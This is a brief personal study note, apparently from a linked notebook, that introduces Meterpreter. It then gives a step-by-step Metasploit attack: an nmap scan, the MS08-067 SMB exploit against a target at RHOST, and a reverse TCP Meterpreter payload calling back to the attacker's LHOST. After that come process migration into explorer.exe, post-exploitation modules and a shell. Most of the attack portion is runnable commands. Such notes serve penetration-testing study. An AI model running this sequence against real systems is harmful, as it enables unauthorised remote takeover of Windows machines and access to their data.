Is an advanced payload that uses in-memory DLL injection stagers.

**Meterpreter** comunicates over the stager socket and provides a comprehensive client-side Ruby API.

There are 3 types of payloads:
- **Singles**
- **Stagers**
- **Stages**

No new processes are created as Meterpreter injects itself and also uses encrypted communication.

New features can be added to Meterpreter without having to rebuild it.

---
- First of all, scan the ports that are accesible:
````
nmap -sV ip_addr
````
In this example, the port 445 is opened.
- Start Metasploit and postgresql and attack it:
````
service postgresql start

msfconsole

search ms08-067

use exploit/windows/smb/ms08_067_netapi

info

show options

set RHOST ipvictim_addr

show payloads #find the meterpreter

set payload windows/meterpreter/reverse_tcp

show options

set LHOST eth0 #local ip address

exploit
````
Now we get a full meterpreter.

- Now, we have to migrate our process:
````
ps #obtains the running processes

#search the process called explorer.exe
#migrate the shell to that process

migrate PID_process
````

Once here, we can run the post-exploitation payloads described in [[2. Post exploitation in Metasploit üåç]]:
````
run checkvm

run winenum
````

- We can obtain a shell typing:
````
shell
````